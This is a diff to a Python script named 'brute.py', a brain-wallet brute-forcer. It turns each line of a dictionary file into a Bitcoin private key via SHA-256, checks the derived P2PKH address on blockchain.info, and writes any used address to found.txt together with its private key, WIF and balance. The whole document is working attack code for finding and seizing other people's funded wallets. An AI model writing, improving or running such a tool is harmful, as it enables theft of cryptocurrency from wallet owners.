@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
-# brute.py (modified)
-# Only BTC P2PKH (1...) and Ethereum addresses; default dictionary.txt -> found.txt
+# brute.py
+# Minimal iSH-friendly scanner: only p2pkh, blockchain.info default,
+# dictionary.txt -> found.txt, one-field-per-line output.
+
 from __future__ import annotations
 import io, sys, logging, time, binascii, hashlib, json, os, random
 import requests
@@ -13,74 +15,7 @@ except Exception as e:
     print("Missing dependencies. Install: pip3 install requests ecdsa base58")
     raise
 
-# optional coincurve for taproot (we won't use p2tr here, but keep flag)
-try:
-    import coincurve
-    HAVE_COINCURVE = True
-except Exception:
-    HAVE_COINCURVE = False
-
-# try to get keccak_256
-try:
-    from sha3 import keccak_256
-except Exception:
-    # fallback to hashlib.sha3_256 (not exact Keccak but a fallback if pysha3 not installed)
-    try:
-        keccak_256 = lambda b=b'': hashlib.sha3_256(b)
-    except Exception:
-        keccak_256 = None
-
-# --- minimal bech32 / segwit helpers (unchanged) ---
-CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
-def bech32_polymod(values):
-    GENERATORS = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
-    chk = 1
-    for v in values:
-        top = chk >> 25
-        chk = ((chk & 0x1ffffff) << 5) ^ v
-        for i in range(5):
-            if ((top >> i) & 1):
-                chk ^= GENERATORS[i]
-    return chk
-
-def bech32_hrp_expand(hrp):
-    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]
-
-def bech32_create_checksum(hrp, data, spec='bech32'):
-    const = 1 if spec == 'bech32' else 0x2bc830a3
-    values = bech32_hrp_expand(hrp) + data
-    polymod = bech32_polymod(values + [0]*6) ^ const
-    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]
-
-def bech32_encode(hrp, data, spec='bech32'):
-    combined = data + bech32_create_checksum(hrp, data, spec=spec)
-    return hrp + '1' + ''.join([CHARSET[d] for d in combined])
-
-def convertbits(data, frombits, tobits, pad=True):
-    acc = 0; bits = 0; ret = []; maxv = (1 << tobits) - 1
-    for value in data:
-        if value < 0 or (value >> frombits):
-            return None
-        acc = (acc << frombits) | value
-        bits += frombits
-        while bits >= tobits:
-            bits -= tobits
-            ret.append((acc >> bits) & maxv)
-    if pad:
-        if bits:
-            ret.append((acc << (tobits - bits)) & maxv)
-    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
-        return None
-    return ret
-
-def segwit_addr_encode(hrp, witver, witprog):
-    if witver < 0 or witver > 16 or len(witprog) < 2 or len(witprog) > 40:
-        return None
-    data = [witver] + convertbits(list(witprog), 8, 5)
-    spec = 'bech32' if witver == 0 else 'bech32m'
-    return bech32_encode(hrp, data, spec=spec)
-
-# ------------------ Wallet (no coinkit) ------------------
+# ------------------ Wallet (p2pkh only) ------------------
 class Wallet:
     """
     Wallet(passphrase, is_private_key=False)
@@ -89,7 +24,7 @@ class Wallet:
     Exposes:
       - private_key (hex)
       - wif
-      - addresses dict: p2pkh, eth
+      - addresses dict: only 'p2pkh'
     """
     def __init__(self, passphrase, is_private_key=False):
         self.passphrase = passphrase
@@ -103,15 +38,9 @@ class Wallet:
             # derive from passphrase
             self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
         self.wif = self._hex_to_wif(self.private_key)
-        # compressed pubkey for BTC
         self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
-        # uncompressed pubkey for ETH derivation
-        self.pubkey_uncompressed = self._priv_to_uncompressed_pubkey(self.private_key)
         self.addresses = {}
-        # only P2PKH (1...) for BTC
         self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)
-        # derive ethereum address
-        self.addresses['eth'] = self._eth_address_from_uncompressed(self.pubkey_uncompressed)
 
     def _looks_like_hex(self, s):
         try:
@@ -149,14 +78,6 @@ class Wallet:
         prefix = b'\x02' if (y[-1] % 2 == 0) else b'\x03'
         return prefix + x
 
-    def _priv_to_uncompressed_pubkey(self, priv_hex):
-        priv = binascii.unhexlify(priv_hex)
-        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
-        vk = sk.get_verifying_key()
-        px = vk.to_string()
-        # uncompressed prefix 0x04 + x + y
-        return b'\x04' + px
-
     def _hash160(self, data_bytes):
         return hashlib.new('ripemd160', hashlib.sha256(data_bytes).digest()).digest()
 
@@ -166,32 +87,11 @@ class Wallet:
         checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
         return base58.b58encode(pref + checksum).decode()
 
-    def _p2wpkh_bech32(self, pubkey_bytes):
-        witprog = self._hash160(pubkey_bytes)
-        return segwit_addr_encode("bc", 0, witprog)
-
-    def _p2sh_p2wpkh(self, pubkey_bytes):
-        witprog = self._hash160(pubkey_bytes)
-        redeem = b'\x00\x14' + witprog
-        redeem_hash = hashlib.new('ripemd160', hashlib.sha256(redeem).digest()).digest()
-        pref = b'\x05' + redeem_hash
-        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
-        return base58.b58encode(pref + checksum).decode()
-
-    def _eth_address_from_uncompressed(self, uncompressed_pub):
-        # uncompressed_pub: b'\x04' + x (32) + y (32)
-        if not uncompressed_pub or len(uncompressed_pub) != 65:
-            return None
-        pub_bytes = uncompressed_pub[1:]  # x||y
-        if keccak_256 is None:
-            return None
-        h = keccak_256(pub_bytes).hexdigest()
-        return "0x" + h[-40:]
-
     def __repr__(self):
-        return "<Wallet priv=%s addr_p2pkh=%s eth=%s>" % (self.private_key[:8], self.addresses.get('p2pkh'), self.addresses.get('eth'))
+        return "<Wallet priv=%s addr_p2pkh=%s>" % (self.private_key[:8], self.addresses.get('p2pkh'))
 
-# ------------------ BaseBlockExplorer & concrete classes (unchanged except kept here) ------------------
+
+# ------------------ BaseBlockExplorer & concrete classes (unchanged) ------------------
 
 class BaseBlockExplorer(object):
     def __init__(self):
@@ -266,13 +166,6 @@ class BaseBlockExplorer(object):
         return num
 
     @staticmethod
-    def text_to_float(text):
-        try:
-            return float(text)
-        except Exception:
-            raise
-
-    @staticmethod
     def satoshi_to_btc(value):
         try:
             return float(value) / 100000000.0
@@ -299,17 +192,18 @@ class BlockchainInfo(BaseBlockExplorer):
         val = super().get_balance(public_address)
         return self.satoshi_to_btc(val)
 
-# ------------------ Main scanning CLI (simplified default filenames, no flags) ------------------
+
+# ------------------ Main scanning (hard-coded defaults, p2pkh only) ------------------
 
 def main():
-    # defaults (no CLI flags)
-    dict_path = "dictionary.txt"
-    out_path = "found.txt"
+    # Hard-coded defaults as requested
+    dict_path = 'dictionary.txt'
+    out_path = 'found.txt'
+    use_private_key_lines = False  # lines are treated as passphrases -> SHA256 -> privkey
+    sleep_between_success = 0.06
 
-    # simple logging to DEBUG by env var if desired
-    debug = os.environ.get("BRUTE_DEBUG", "") != ""
-    logging.basicConfig(level=logging.DEBUG if debug else logging.INFO,
-                        format='%(asctime)s %(levelname)-6s %(message)s')
+    logging.basicConfig(level=logging.INFO,
+                        format='%(asctime)s %(levelname)-6s line %(lineno)-4s %(message)s')
 
     explorer = BlockchainInfo()
     explorer.open_session()
@@ -319,108 +213,115 @@ def main():
         with io.open(dict_path, 'rt', encoding='utf-8') as f:
             f.read(4096)
     except Exception as e:
-        print("Failed to open dict file %s : %s" % (dict_path, e))
+        logging.error("Failed to open dict file %s : %s", dict_path, e)
         sys.exit(1)
     f_dictionary = io.open(dict_path, 'rt', encoding='utf-8')
 
+    # Prepare output
     try:
         fout = open(out_path, 'w', encoding='utf-8')
-        fout.write('dictionary_word,address_type,address,received_btc,private_hex,wif,current_balance_btc\n')
     except Exception as e:
-        print("Failed to open output file %s : %s" % (out_path, e))
+        logging.error("Failed to open output file %s : %s", out_path, e)
         sys.exit(1)
 
-    # Loop
+    # For each word, only generate p2pkh and check received/balance
     for raw in f_dictionary:
-        word = raw.rstrip()
+        word = raw.rstrip('\n').rstrip('\r')
         if not word:
             continue
-        # clean line-by-line print
-        print("processing:", word)
+        logging.debug("processing: %s", word)
         try:
-            wallet = Wallet(word, is_private_key=False)
+            wallet = Wallet(word, is_private_key=use_private_key_lines)
         except Exception as e:
-            print("warning: failed to create wallet for '%s': %s" % (word, e))
+            logging.warning("Failed to create wallet for '%s': %s", word, e)
             continue
 
-        # only check p2pkh and eth in that order
-        for atype in ("p2pkh", "eth"):
-            addr = wallet.addresses.get(atype)
-            if not addr:
-                print("skipping: %s no address for type %s" % (word, atype))
-                continue
+        atype = 'p2pkh'
+        addr = wallet.addresses.get(atype)
+        if not addr:
+            logging.debug("no p2pkh for %s", word)
+            continue
 
-            # get received with retries/backoff
-            retry = 0
-            max_retries = 4
-            backoff = 1.0
-            received = 0.0
-            while retry < max_retries:
-                try:
-                    received_raw = explorer.get_received(addr)
-                    if received_raw > 1000000000:
+        # get received with retries/backoff
+        retry = 0
+        max_retries = 4
+        backoff = 1.0
+        received = 0.0
+        while retry < max_retries:
+            try:
+                received_raw = explorer.get_received(addr)
+                if received_raw > 1000000000:
+                    received = float(received_raw) / 1e8
+                elif received_raw > 1 and received_raw < 1000000000:
+                    if float(received_raw).is_integer():
                         received = float(received_raw) / 1e8
-                    elif received_raw > 1 and received_raw < 1000000000:
-                        if float(received_raw).is_integer():
-                            received = float(received_raw) / 1e8
-                        else:
-                            received = float(received_raw)
                     else:
                         received = float(received_raw)
-                    break
-                except Exception as e:
-                    retry += 1
-                    sleep = backoff * (2 ** (retry-1)) * (0.5 + random.random())
-                    print("error fetching received for %s (%s): %s — retry %d/%d sleeping %.2fs" %
-                          (addr, atype, e, retry, max_retries, sleep))
-                    time.sleep(sleep)
-            if retry == max_retries:
-                print("Giving up fetching received for %s (%s)" % (addr, atype))
-                continue
+                else:
+                    received = float(received_raw)
+                break
+            except Exception as e:
+                retry += 1
+                sleep_time = backoff * (2 ** (retry-1)) * (0.5 + random.random())
+                logging.warning("Error fetching received for %s (%s): %s — retry %d/%d sleeping %.2fs",
+                                addr, atype, e, retry, max_retries, sleep_time)
+                time.sleep(sleep_time)
+        if retry == max_retries:
+            logging.error("Giving up fetching received for %s (%s)", addr, atype)
+            continue
 
-            if received == 0:
-                # polite sleep to avoid hammering
-                time.sleep(0.06)
-                continue
+        if received == 0:
+            logging.debug("no received for %s (%s)", addr, atype)
+            time.sleep(sleep_between_success)
+            continue
 
-            # get balance
-            retry = 0
-            balance = 0.0
-            while retry < max_retries:
-                try:
-                    balance_raw = explorer.get_balance(addr)
-                    if balance_raw > 1000000000:
+        # get balance
+        retry = 0
+        balance = 0.0
+        while retry < max_retries:
+            try:
+                balance_raw = explorer.get_balance(addr)
+                if balance_raw > 1000000000:
+                    balance = float(balance_raw) / 1e8
+                elif balance_raw > 1 and balance_raw < 1000000000:
+                    if float(balance_raw).is_integer():
                         balance = float(balance_raw) / 1e8
-                    elif balance_raw > 1 and balance_raw < 1000000000:
-                        if float(balance_raw).is_integer():
-                            balance = float(balance_raw) / 1e8
-                        else:
-                            balance = float(balance_raw)
                     else:
                         balance = float(balance_raw)
-                    break
-                except Exception as e:
-                    retry += 1
-                    sleep = backoff * (2 ** (retry-1)) * (0.5 + random.random())
-                    print("error fetching balance for %s (%s): %s — retry %d/%d sleeping %.2fs" %
-                          (addr, atype, e, retry, max_retries, sleep))
-                    time.sleep(sleep)
-            if retry == max_retries:
-                print("Giving up fetching balance for %s (%s)" % (addr, atype))
-                continue
+                else:
+                    balance = float(balance_raw)
+                break
+            except Exception as e:
+                retry += 1
+                sleep_time = backoff * (2 ** (retry-1)) * (0.5 + random.random())
+                logging.warning("Error fetching balance for %s (%s): %s — retry %d/%d sleeping %.2fs",
+                                addr, atype, e, retry, max_retries, sleep_time)
+                time.sleep(sleep_time)
+        if retry == max_retries:
+            logging.error("Giving up fetching balance for %s (%s)", addr, atype)
+            continue
 
-            out_line = "{word},{atype},{addr},{received:.8f},{priv},{wif},{balance:.8f}".format(
-                word=word, atype=atype, addr=addr,
-                received=received, priv=wallet.private_key, wif=wallet.wif, balance=balance)
-            # print clean line and write to file
-            print("FOUND:", out_line)
-            fout.write(out_line + '\n'); fout.flush()
-            time.sleep(0.06)
+        # write output as one field per line (7 lines) + blank line
+        try:
+            fout.write(str(word) + '\n')
+            fout.write(str(atype) + '\n')
+            fout.write(str(addr) + '\n')
+            fout.write("{:.8f}".format(received) + '\n')
+            fout.write(str(wallet.private_key) + '\n')
+            fout.write(str(wallet.wif) + '\n')
+            fout.write("{:.8f}".format(balance) + '\n')
+            fout.write('\n')
+            fout.flush()
+            logging.info("Found used wallet for word '%s' addr %s", word, addr)
+        except Exception as e:
+            logging.error("Failed writing output for %s: %s", word, e)
+
+        time.sleep(sleep_between_success)
 
     explorer.close_session()
     fout.close()
     f_dictionary.close()
-    print("Done.")
+    logging.info("Done.")
 
 if __name__ == '__main__':
     main()
